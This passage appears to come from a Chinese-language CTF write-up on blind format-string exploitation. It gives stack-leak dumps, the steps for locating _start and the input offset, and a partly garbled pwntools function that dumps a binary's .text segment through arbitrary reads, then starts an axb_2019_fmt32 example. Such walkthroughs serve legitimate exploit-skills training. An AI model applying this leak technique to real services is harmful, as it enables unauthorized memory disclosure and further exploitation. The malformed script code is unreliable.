    [*] 64 0xffffffff.TMP
    [*] 68 0x2f.TMP  
    [*] 72 0xf7d7cdc8.TMP
    [*] 76 0xf7f3f1b0.TMP
    [*] 80 0x8000.TMP
    [*] 84 0xf7f22000.TMP
    [*] 88 0xf7f20244.TMP
    [*] 92 0xf7d880ec.TMP
    [*] 96 0x1.TMP   
    [*] 100 0x1.TMP   
    [*] 104 0xf7d9ea50.TMP
    [*] 108 0x80485eb.TMP
    [*] 112 0x1.TMP   
    [*] 116 0xffd64de4.TMP
    [*] 120 0xffd64dec.TMP
    [*] 124 0x80485c1.TMP
    [*] 128 0xf7f223dc.TMP
    [*] 132 0xffd64d50.TMP
    [*] 136 (nil).TMP 
    [*] 140 0xf7d88637.TMP
    [*] 144 0xf7f22000.TMP
    [*] 148 0xf7f22000.TMP
    [*] 152 (nil).TMP 
    [*] 156 0xf7d88637.TMP
    [*] 160 0x1.TMP   
    [*] 164 0xffd64de4.TMP
    [*] 168 0xffd64dec.TMP
    [*] 172 (nil).TMP 
    [*] 176 (nil).TMP 
    [*] 180 (nil).TMP 
    [*] 184 0xf7f22000.TMP
    [*] 188 0xf7f69c04.TMP
    [*] 192 0xf7f69000.TMP
    [*] 196 (nil).TMP 
    [*] 200 0xf7f22000.TMP
    [*] 204 0xf7f22000.TMP
    [*] 208 (nil).TMP 
    [*] 212 0xc2983082.TMP
    [*] 216 0xdf097e92.TMP
    [*] 220 (nil).TMP 
    [*] 224 (nil).TMP 
    [*] 228 (nil).TMP 
    [*] 232 0x1.TMP   
    [*] 236 0x8048420.TMP
    [*] 240 (nil).TMP 
    [*] 244 0xf7f5a010.TMP
    [*] 248 0xf7f54880.TMP
    [*] 252 0xf7f69000.TMP
    [*] 256 0x1.TMP   
    [*] 260 0x8048420.TMP
    [*] 264 (nil).TMP 
    [*] 268 0x8048441.TMP
    [*] 272 0x804851b.TMP
    [*] 276 0x1.TMP   
    [*] 280 0xffd64de4.TMP
    [*] 284 0x80485a0.TMP
    [*] 288 0x8048600.TMP
    [*] 292 0xf7f54880.TMP
    [*] 296 0xffd64ddc.TMP
    [*] 300 0xf7f69918.TMP
    [*] 304 0x1.TMP   
    [*] 308 0xffd66246.TMP
    [*] 312 (nil).TMP 
    [*] 316 0xffd66262.TMP
    [*] 320 0xffd66283.TMP
    [*] 324 0xffd662b7.TMP
    [*] 328 0xffd662e3.TMP
    [*] 332 0xffd66303.TMP
    [*] 336 0xffd66318.TMP
    [*] 340 0xffd6632a.TMP
    [*] 344 0xffd6633b.TMP
    [*] 348 0xffd66349.TMP
    [*] 352 0xffd663de.TMP
    [*] 356 0xffd663e9.TMP
    [*] 360 0xffd66400.TMP
    [*] 364 0xffd6640b.TMP
    [*] 368 0xffd6641c.TMP
    [*] 372 0xffd66430.TMP
    [*] 376 0xffd66440.TMP
    [*] 380 0xffd6647a.TMP
    [*] 384 0xffd664a0.TMP
    [*] 388 0xffd664af.TMP
    [*] 392 0xffd66501.TMP
    [*] 396 0xffd66509.TMP
我们希望能从泄露的数据中获取`_start`函数的地址，而`_start`函数正是`.text`(代码段)的起始地址。
此处我们发现了在泄露序号为236和260的位置出现了相同的明显位于`.text`段中的相同地址，这就是`_start`函数的地址。
**Dump`.text`**
首先，我们需要先确定我们的格式化字符串位置，再利用格式化字符串漏洞中的任意地址读漏洞来dump整个`.text`段。
已知我们输入的字符串一定是`%N$p`，转换成十六进制就是`0x25??2470`，由于数据在内存中是逆序存储的，很容易可以发现，当`N=7`时，回显的是`[*]
28 0x70243725.TMP`，也就是说，我们接下来要使用`%8$s+addr`的格式化控制符来泄露代码段数据。
⚠此处注意：%s进行输出时实际上是x00截断的，但是.text段中不可避免会出现x00，但是我们注意到还有一个特性，如果对一个x00的地址进行leak，返回是没有结果的，因此如果返回没有结果，我们就可以确定这个地址的值为x00，所以可以设置为x00然后将地址加1进行dump。
    def dump_text(start_addr=0):
        text_segment=''
        try:
            while True:
                payload = 'Leak--->%11$s')
                value = sh.recvuntil('%11$s')
                value = sh.recvuntil('<-|').strip('<-|')
                text_segment += value
                start_addr += len(value)
                if(len(value)==0):
                    text_segment += 'x00'
                    start_addr += 1
                if(text_segment[-9:-1]=='x00'*8):
                    break
        except Exception as e:
            print(e)
        finally:
            log.info('We get ' + str(len(text_segment)) +'byte file!')
            with open('blind_pwn_printf_demo_x32_dump','wb') as fout:
                fout.write(text_segment)
    start_addr=where_is_start()
    dump_text(start_addr)
使用方法：首先注释`dump_text`函数，查看`leak`结果，并确定`_start`函数位置，将位置填入`where_is_start()`的参数区域，解除`dump_text`函数的注释。
###  以axb_2019_fmt32为例
⚠：本题目在BUUOJ上已被搭建，但是题目给出了源文件，原题为盲打题目，此处也只利用nc接口解题。
**Leak Stack & Where is `.text`**
这里泄露的数据中出现了大量的`(nil)`，重复部分已被隐去。
    [*] 0 %0$p      
    [*] 4 0x804888d 
    [*] 8 0xff8e45ef
    [*] 12 0xf7f4d53c
    [*] 16 0xff8e45f8
    [*] 20 0xf7f295c5
    [*] 24 0x13      
    [*] 28 0x258e46e4
    [*] 32 0x3c702438
    [*] 36 0xa7c2d2d 
    [*] 40 0xa       
    [*] 44 (nil)     
    ....... (nil)       
    [*] 284 (nil)     
    [*] 288 0x65706552
    [*] 292 0x72657461
    [*] 296 0x3437253a
    [*] 300 0x2d3c7024
    [*] 304 0xa0a7c2d 
    [*] 308 (nil)     
    ....... (nil)    
    [*] 584 (nil)     
    [*] 588 0xb9008800
    [*] 592 0xf7f1b3dc
    [*] 596 0xff8e4840
    [*] 600 (nil)     
    [*] 604 0xf7d83637
    [*] 608 0xf7f1b000
    [*] 612 0xf7f1b000
    [*] 616 (nil)     
    [*] 620 0xf7d83637
    [*] 624 0x1       
    [*] 628 0xff8e48d4
    [*] 632 0xff8e48dc
    [*] 636 (nil)     
    [*] 640 (nil)     
    [*] 644 (nil)     
    [*] 648 0xf7f1b000
    [*] 652 0xf7f4dc04
    [*] 656 0xf7f4d000
    [*] 660 (nil)     
    [*] 664 0xf7f1b000
    [*] 668 0xf7f1b000
    [*] 672 (nil)     
    [*] 676 0x7d0c2af6